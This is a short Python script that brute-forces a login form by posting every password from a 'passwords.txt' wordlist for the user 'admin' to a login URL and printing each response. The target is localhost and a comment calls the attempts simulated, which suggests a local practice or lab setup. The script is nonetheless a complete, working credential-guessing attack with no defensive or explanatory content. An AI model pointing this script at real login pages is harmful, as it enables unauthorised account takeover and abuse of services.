import requests

URL = "http://127.0.0.1:5000/login"

username = "admin"

# Read passwords from file
with open("passwords.txt", "r") as file:
    password_list = file.read().splitlines()

# Simulated login attempts
for pwd in password_list:
    data = {
        "username": username,
        "password": pwd
    }

    response = requests.post(URL, data=data)

    print(f"[TRY] {pwd} -> {response.text}")
